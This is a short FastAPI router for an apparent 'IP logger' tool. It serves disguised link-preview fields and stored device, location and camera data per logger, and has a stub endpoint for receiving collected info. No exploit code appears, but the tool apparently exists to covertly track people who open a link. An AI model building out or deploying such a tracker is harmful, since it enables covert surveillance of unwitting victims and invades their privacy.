from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import insert, select
from models import User, IPLogger, BadTrip
from pydantic_models import iploggerCreate
from database import get_db

router = APIRouter()

@router.get("/")
async def get_iplogger(id: str, db: AsyncSession = Depends(get_db)):
    query = select(IPLogger).where(IPLogger.id == id)
    result = await db.execute(query)
    iplogger = result.scalars().first()

    if not iplogger:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="IP logger not found",
        )
    
    return {
        "template": iplogger.template,
        "title_preview": iplogger.title_preview,
        "description_preview": iplogger.description_preview,
        "image_preview": iplogger.image_preview,
        "device_data": iplogger.device_data,
        "location_data": iplogger.location_data,
        "cam_data": iplogger.cam_data
    }


@router.post("/info")
async def receive_iplogger_info(iplogger_info: dict):
    """
    Receive IP logger information.
    """
    # Process the IP logger information here
    return {"message": "IP logger information received successfully"}

